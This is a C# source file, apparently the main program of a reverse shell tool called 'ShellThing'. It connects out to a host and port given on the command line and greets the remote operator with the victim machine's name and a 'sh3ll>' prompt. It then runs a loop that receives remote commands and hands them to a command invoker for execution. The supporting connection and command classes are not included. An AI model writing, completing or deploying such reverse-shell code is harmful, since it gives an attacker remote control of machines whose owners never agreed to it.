using System;
using System.Collections.Generic;

namespace ShellThing
{
    class Program
    {
        static TcpReverseConnection connection;
        static readonly string prompt = "sh3ll> ";

        public static void Main(string[] args)
        {
            if(args.Length != 2)
            {
                throw new ArgumentException();
            }
            else
            {
                connection = new TcpReverseConnection();
                connection.StartClient(args[0], args[1]);

                // Initialize invoker which sets commands in its constructor
                CommandInvoker commandInvoker = new CommandInvoker(connection);

                connection.SendData($"Connected! Welcome to {Environment.MachineName}\nType 'help' to see available commands\n");

                while(connection.IsConnected)
                {
                    connection.SendData(prompt);
                    // TODO: try/catch for ctrl+c close of connection - maybe attempt reconnect??
                    string commandReceived = connection.ReceiveData();

                    try
                    {
                        commandInvoker.ParseCommandReceived(commandReceived);
                    }
                    catch (Exception e)
                    {
                        connection.SendData($"Exception: {e.Message}");
                    }
                    
                }
            }
        }
    }
}
